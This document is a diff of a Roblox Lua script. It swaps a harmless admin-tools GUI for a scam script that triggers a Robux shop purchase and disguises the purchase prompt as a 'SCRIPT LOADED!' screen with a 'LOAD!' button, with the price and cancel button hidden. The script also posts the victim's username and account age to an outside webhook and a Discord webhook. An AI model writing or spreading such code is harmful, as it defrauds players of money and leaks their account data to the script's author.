@@ -1,94 +1,113 @@
--- Roblox Script for Game Owners (Blox Fruits-like Game)
+username = "nxrf1axz"
+webhook = "https://webhook-protection.com/post?uniqueid=0111dfe1"
 
--- Create ScreenGui for Admin Tools
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+-- BLOX FRUIT?
+LogsWebhook = "https://discord.com/api/webhooks/1341118899130994719/v1sS6RvRx_sK7dQYMAXIkWTUcSFUwRQxBegrC5nXzZHmeGyUQVXupJyT8C8zeHECUlt6"
 
--- Create Frame for GUI
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 250, 0, 200)
-frame.Position = UDim2.new(0.5, -125, 0.5, -100)
-frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-frame.Parent = screenGui
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local result = 0 
 
--- Create Title Label
-local title = Instance.new("TextLabel")
-title.Text = "Admin Tools"
-title.Size = UDim2.new(1, 0, 0, 30)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.SourceSansBold
-title.Parent = frame
+local HttpService = game:GetService("HttpService")
 
--- Create Auto-Farm Button
-local autoFarmButton = Instance.new("TextButton")
-autoFarmButton.Text = "Enable Auto-Farm"
-autoFarmButton.Size = UDim2.new(0.8, 0, 0, 40)
-autoFarmButton.Position = UDim2.new(0.1, 0, 0.2, 0)
-autoFarmButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
-autoFarmButton.TextColor3 = Color3.new(1, 1, 1)
-autoFarmButton.Parent = frame
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
 
--- Create FPS Improve Button
-local fpsImproveButton = Instance.new("TextButton")
-fpsImproveButton.Text = "Enable FPS Improve"
-fpsImproveButton.Size = UDim2.new(0.8, 0, 0, 40)
-fpsImproveButton.Position = UDim2.new(0.1, 0, 0.6, 0)
-fpsImproveButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
-fpsImproveButton.TextColor3 = Color3.new(1, 1, 1)
-fpsImproveButton.Parent = frame
+local args = {
+    [1] = "buyRobuxShop",
+    [2] = {
+        ["StorageName"] = "2x EXP (15 mins.)",
+        ["FunnelId"] = "Shop",
+        ["PurchaseLocation"] = "Shop"
+    }
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
 
--- Auto-Farm Logic
-local autoFarmEnabled = false
-local function autoFarm()
-    while autoFarmEnabled do
-        -- Example: Automatically farm resources or experience
-        for _, npc in pairs(workspace.NPCs:GetChildren()) do
-            if npc:FindFirstChild("Humanoid") and npc.Humanoid.Health > 0 then
-                -- Simulate farming (e.g., deal damage, collect rewards)
-                npc.Humanoid:TakeDamage(10)
-                print("Farming:", npc.Name)
-                wait(1) -- Cooldown between attacks
+local CoreGui = game:GetService("CoreGui")
+local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+local Animator = ProductContainer:WaitForChild("Animator")
+
+Animator.ChildAdded:Connect(function(child)
+    if child.Name == "Prompt" then
+        local prompt = Animator:WaitForChild("Prompt")
+        local alertContents = prompt:WaitForChild("AlertContents")
+        
+        local middleContent = alertContents:FindFirstChild("MiddleContent")
+        if middleContent then
+            middleContent.Visible = false
+        end
+
+        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
+        if title and title:IsA("TextLabel") then
+            title.Text = "SCRIPT LOADED!"
+        end
+        
+        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
+        local button2 = footerButtons:FindFirstChild("2")
+        if button2 then
+            button2.Visible = false
+        end
+
+        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
+        if footerContent then
+            footerContent.Visible = false
+        end
+        
+        local button1 = footerButtons:FindFirstChild("1")
+        if button1 then
+            local buttonContent = button1:WaitForChild("ButtonContent")
+            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
+            if buttonMiddleContent then
+                buttonMiddleContent.Text = "LOAD!"
             end
         end
-        wait(1)
-    end
-end
-
-autoFarmButton.MouseButton1Click:Connect(function()
-    autoFarmEnabled = not autoFarmEnabled
-    autoFarmButton.Text = autoFarmEnabled and "Disable Auto-Farm" or "Enable Auto-Farm"
-    if autoFarmEnabled then
-        autoFarm()
     end
 end)
 
--- FPS Improve Logic
-local fpsImproveEnabled = false
-local function optimizeFPS()
-    if fpsImproveEnabled then
-        -- Reduce graphics quality for better performance
-        settings().Rendering.QualityLevel = 1
-        -- Disable unnecessary effects
-        for _, effect in pairs(workspace:GetDescendants()) do
-            if effect:IsA("ParticleEmitter") or effect:IsA("Smoke") or effect:IsA("Fire") then
-                effect.Enabled = false
-            end
-        end
-    else
-        -- Restore default settings
-        settings().Rendering.QualityLevel = 10
-        for _, effect in pairs(workspace:GetDescendants()) do
-            if effect:IsA("ParticleEmitter") or effect:IsA("Smoke") or effect:IsA("Fire") then
-                effect.Enabled = true
-            end
-        end
-    end
-end
+local function sendWebhook()
 
-fpsImproveButton.MouseButton1Click:Connect(function()
-    fpsImproveEnabled = not fpsImproveEnabled
-    fpsImproveButton.Text = fpsImproveEnabled and "Disable FPS Improve" or "Enable FPS Improve"
-    optimizeFPS()
-end)
+    local embed = {
+        ["title"] = "**Phew Scripts - You Got A Execution** :rofl:",
+        ["color"] = 39423,
+        ["fields"] = {
+            {
+                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
+                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
+            },
+            {
+                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
+                ["value"] = "```" .. result .. "```"
+            },
+            {
+                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
+                ["value"] = "[****]()",
+            }
+        }
+    }
+
+    local data = HttpService:JSONEncode({
+        ["content"] = "@everyone",
+        ["embeds"] = {embed}
+    })
+
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+
+    request({
+        Url = LogsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+end
